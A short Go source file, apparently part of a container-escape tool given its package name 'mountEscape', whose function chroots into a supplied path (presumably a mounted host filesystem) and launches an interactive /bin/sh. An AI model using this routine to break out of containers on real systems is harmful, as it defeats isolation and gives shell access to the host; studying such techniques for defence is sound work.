package mountEscape

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func Chroot(rootPath string) error {

	// 尝试对父进程进行 chroot 操作
	if err := syscall.Chroot(rootPath); err != nil {
		return err
	}

	if err := os.Chdir("/"); err != nil {
		return err
	}

	// 获取当前工作目录
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}

	// 打印当前工作目录
	fmt.Println("当前工作目录:", cwd)

	// 执行新的 /bin/sh 进程
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return err
	}
	return nil
}
